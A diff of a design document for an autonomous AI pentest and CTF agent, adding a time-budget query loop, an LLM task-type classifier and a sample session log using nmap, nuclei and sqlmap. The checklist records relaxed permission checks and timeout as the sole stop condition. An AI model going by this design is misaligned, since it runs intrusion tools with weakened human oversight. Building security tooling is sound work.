+- If time is running low, prioritize high-probability approaches
+- Don't spend too long on one technique if it's not working
+- Consider fallback strategies when time is limited
+- Document partial findings even if task incomplete
+
+### Efficiency Guidelines
+- Parallelize independent tasks when possible
+- Use automated tools for repetitive operations
+- Skip deep analysis on low-priority findings
+- Move on quickly from failed approaches
+
+The system will warn you when time is running low. Respect the time limit.
+"""
+
+
+async def query_with_time_management(
+    messages: List[Dict],
+    config: QueryConfig,
+    session_id: str,
+    task_type: TaskType,
+) -> AsyncGenerator[Dict, None]:
+    """
+    带时间管理的Query循环
+    """
+    from app.core.time_manager import TimeManager, TIME_MANAGEMENT_PROMPT
+    
+    time_manager = TimeManager()
+    
+    # 1. 创建时间预算
+    budget = time_manager.create_budget(session_id, task_type)
+    
+    # 2. 注入时间管理Prompt
+    time_prompt = TIME_MANAGEMENT_PROMPT + f"\n\n### Your Time Budget\n- Task Type: {task_type.value}\n- Total Time: {budget.total_seconds / 60:.0f} minutes\n"
+    config.system_prompt = config.system_prompt + "\n\n" + time_prompt
+    
+    # 3. 在每次循环检查时间
+    turn_count = 0
+    last_time_warning = 0
+    
+    while turn_count < config.max_turns:
+        # 检查超时 - 唯一熔断条件
+        if time_manager.should_stop(session_id):
+            yield {
+                "type": "timeout",
+                "message": "Time budget exhausted. Task terminated.",
+                "elapsed_seconds": budget.elapsed_seconds,
+            }
+            return
+        
+        # 定期注入时间状态（每10%进度或每5轮）
+        if (budget.progress_ratio >= last_time_warning + 0.1) or (turn_count > 0 and turn_count % 5 == 0):
+            time_status = time_manager.get_time_prompt(session_id)
+            if time_status:
+                # 注入时间状态到消息
+                messages.append({
+                    "role": "user",
+                    "content": time_status
+                })
+                last_time_warning = budget.progress_ratio
+        
+        # 执行正常Query循环...
+        # (复用之前的query函数逻辑)
+        
+        turn_count += 1
+```
+
+### 8.3 任务类型自动识别
+
+```python
+# app/core/task_classifier.py
+
+"""
+任务类型自动识别 - AI判断任务类型
+
+Claude Code设计原则:
+- AI分析任务描述，判断类型
+- 根据类型设置合适的时间预算
+- 用户可以覆盖AI的判断
+"""
+
+TASK_CLASSIFICATION_PROMPT = """
+Analyze the following task and classify it into one of these types:
+
+1. **ctf_single**: CTF challenge with a single flag (typical CTF problem)
+2. **ctf_multi**: CTF challenge with multiple flags or stages
+3. **external_attack**: External network penetration testing (recon + exploitation)
+4. **internal**: Internal network penetration (already have initial access)
+5. **full_pentest**: Full penetration test (external + internal)
+6. **code_audit**: Source code security audit
+7. **research**: Security research or proof-of-concept development
+
+Task Description: {task_description}
+
+Target Information: {target_info}
+
+Return ONLY the task type name (e.g., "ctf_single").
+"""
+
+
+async def classify_task(
+    task_description: str,
+    target_info: str,
+) -> TaskType:
+    """
+    使用AI判断任务类型
+    
+    返回对应的TaskType和超时时间
+    """
+    from app.llm_client import llm_client
+    
+    prompt = TASK_CLASSIFICATION_PROMPT.format(
+        task_description=task_description,
+        target_info=target_info,
+    )
+    
+    try:
+        response = llm_client.call_chat_completion(
+            model="glm-5",  # 快速分类用小模型
+            messages=[{"role": "user", "content": prompt}],
+            max_tokens=20,
+            temperature=0.1,
+        )
+        
+        type_str = response.strip().lower()
+        
+        # 映射到TaskType
+        type_mapping = {
+            "ctf_single": TaskType.CTF_SINGLE_FLAG,
+            "ctf_multi": TaskType.CTF_MULTI_FLAG,
+            "external_attack": TaskType.EXTERNAL_ATTACK,
+            "internal": TaskType.INTERNAL_PENETRATION,
+            "full_pentest": TaskType.FULL_PENETRATION,
+            "code_audit": TaskType.CODE_AUDIT,
+            "research": TaskType.RESEARCH,
+        }
+        
+        for key, task_type in type_mapping.items():
+            if key in type_str:
+                return task_type
+        
+        # 默认：CTF单题目
+        return TaskType.CTF_SINGLE_FLAG
+        
+    except Exception:
+        return TaskType.CTF_SINGLE_FLAG
+
+
+# ═══════════════════════════════════════════════════════════
+# 时间配置示例
+# ═══════════════════════════════════════════════════════════
+
+"""
+# 在Memory文档中记录时间分配
+
+session_2026_04_03:
+  task_type: ctf_single
+  time_budget: 30 minutes
+  time_allocation:
+    reconnaissance: 3 minutes
+    exploitation: 12 minutes
+    verification: 9 minutes
+    documentation: 6 minutes
+  
+  # AI可以根据实际情况动态调整
+  actual_usage:
+    nmap_scan: 1 minute
+    httpx_probe: 0.5 minutes
+    nuclei_scan: 2 minutes
+    sqlmap_exploit: 8 minutes
+    flag_extraction: 2 minutes
+  
+  lessons_learned:
+    - SQL injection was found quickly with nuclei
+    - Should have tried sqlmap earlier
+    - Time was well-managed
+"""
+```
+
+---
+
 ## Self-Review Checklist (完整版)
 
 ### 清理完整性
@@ -1600,6 +2804,7 @@ When a tool fails, follow this systematic approach:
 - [x] 区分保留和删除的模块
 - [x] 无遗漏的预制代码
 - [x] 列出需要重构的文件
+- [x] 列出需要删除的缓存文件
 
 ### 移植完整性
 - [x] Query循环核心代码完整
@@ -1609,6 +2814,9 @@ When a tool fails, follow this systematic approach:
 - [x] 前端改造代码完整
 - [x] 权限检查放宽设计完整
 - [x] CTF提示词设计完整
+- [x] 工具选择指导完整（含详细工具分类）
+- [x] Skill延迟加载机制完整
+- [x] 时间管理与唯一熔断条件完整
 
 ### 设计一致性
 - [x] 与Claude Code技术文档100%对齐
@@ -1616,3 +2824,5 @@ When a tool fails, follow this systematic approach:
 - [x] 无预制降级处理
 - [x] AI自主决策机制明确
 - [x] CTF场景特定优化
+- [x] 唯一熔断条件：超时
+- [x] 时间分配：CTF 30min, 外网+内网 2h+
